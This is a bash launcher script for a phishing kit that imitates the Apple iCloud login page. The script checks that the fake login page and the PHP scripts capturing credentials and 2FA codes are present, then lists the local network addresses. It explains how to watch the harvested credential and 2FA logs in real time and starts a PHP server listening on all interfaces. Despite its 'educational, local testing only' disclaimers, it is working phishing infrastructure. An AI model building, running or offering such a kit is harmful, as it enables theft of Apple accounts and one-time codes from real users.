#!/bin/bash

RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
MAGENTA='\033[1;35m'
RESET='\033[0m'

clear
printf "${GREEN}"
cat << 'EOF'
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║        _        __ _     _                               ║
║       (_) ___  / _(_)___| |__                            ║
║       | |/ __|| |_| / __| '_ \                           ║
║       | | (__ |  _| \__ \ | | |                          ║
║       |_|\___||_| |_|___/_| |_|                          ║
║                                                          ║
║        EDUCATIONAL PROJECT - LOCAL TESTING ONLY          ║
║        iCloud fake page for local phishing awareness     ║
║        localhost / 192.168.x.x                           ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
EOF
printf "${RESET}"

echo ""
printf "${YELLOW}  Disclosure:${RESET} This starts an iCloud fake page intended only for local\n"
printf "${YELLOW}  phishing-awareness testing and education.\n"
printf "${YELLOW}  Use only:${RESET} Run it on localhost or authorized private-network devices.\n"
printf "${YELLOW}  Do not collect real credentials.\n"
echo ""
printf "${CYAN}  Working Directory:${RESET} %s\n" "$(pwd)"
echo ""

printf "${YELLOW}  Checking files...${RESET}\n"
if [[ -f "index.html" && -f "pages/verify.html" && -f "captures/capture.php" && -f "captures/capture_2fa.php" ]]; then
    printf "  ${GREEN}✓${RESET} All required files present\n"
else
    printf "  ${RED}✗${RESET} Missing files! Make sure you're in the project root directory\n"
    exit 1
fi

echo ""
printf "${MAGENTA}  Network Information:${RESET}\n"
echo "    Local educational project addresses:"
echo "      → localhost"

if command -v ip &>/dev/null; then
    ip -4 addr show 2>/dev/null | grep -oP '(?<=inet\s)192\.168(\.\d+){2}' | while read ip; do
        echo "      → $ip"
    done
elif command -v ifconfig &>/dev/null; then
    ifconfig 2>/dev/null | grep -oE 'inet 192\.168\.[0-9]+\.[0-9]+' | awk '{print "      → " $2}' | while read ip; do
        echo "$ip"
    done
fi

echo ""
echo "═══════════════════════════════════════════════════════════════════════════"
printf "${GREEN}  LOCAL ACCESS${RESET}\n"
echo "═══════════════════════════════════════════════════════════════════════════"
echo ""
echo "    Open the project page from this machine or an authorized test device:"
echo "    http://localhost      (for local testing)"
if command -v ip &>/dev/null; then
    ip -4 addr show 2>/dev/null | grep -oP '(?<=inet\s)192\.168(\.\d+){2}' | while read ip; do
        echo "    http://$ip          (authorized private network only)"
    done
elif command -v ifconfig &>/dev/null; then
    ifconfig 2>/dev/null | grep -oE 'inet 192\.168\.[0-9]+\.[0-9]+' | awk '{print $2}' | while read ip; do
        echo "    http://$ip          (authorized private network only)"
    done
fi
echo ""
echo "═══════════════════════════════════════════════════════════════════════════"
printf "${CYAN}  MONITORING CAPTURES${RESET}\n"
echo "═══════════════════════════════════════════════════════════════════════════"
echo ""
echo "    Captured data will be stored in: $(pwd)/creds/"
echo "    Educational testing only: do not enter or store real credentials."
echo ""
echo "    Monitor in real-time (in another terminal):"
echo "    tail -f $(pwd)/creds/all_credentials.log"
echo "    tail -f $(pwd)/creds/all_2fa_codes.log"
echo ""
echo "    View all captures:"
echo "    ls -lh $(pwd)/creds/"
echo ""
echo "═══════════════════════════════════════════════════════════════════════════"
printf "${YELLOW}  Starting PHP Development Server...${RESET}\n"
echo "═══════════════════════════════════════════════════════════════════════════"
echo ""

if [ "$(id -u)" -ne 0 ]; then
    printf "${YELLOW}  Not running as root. Trying port 8080 instead...${RESET}\n"
    echo ""
    echo "    Access via: http://localhost:8080"
    if command -v ip &>/dev/null; then
        ip -4 addr show 2>/dev/null | grep -oP '(?<=inet\s)192\.168(\.\d+){2}' | while read ip; do
            echo "    Private network: http://$ip:8080"
        done
    elif command -v ifconfig &>/dev/null; then
        ifconfig 2>/dev/null | grep -oE 'inet 192\.168\.[0-9]+\.[0-9]+' | awk '{print $2}' | while read ip; do
            echo "    Private network: http://$ip:8080"
        done
    fi
    echo ""
    php -S 0.0.0.0:8080
else
    echo "    Running on port 80 (requires root)"
    echo ""
    php -S 0.0.0.0:80
fi
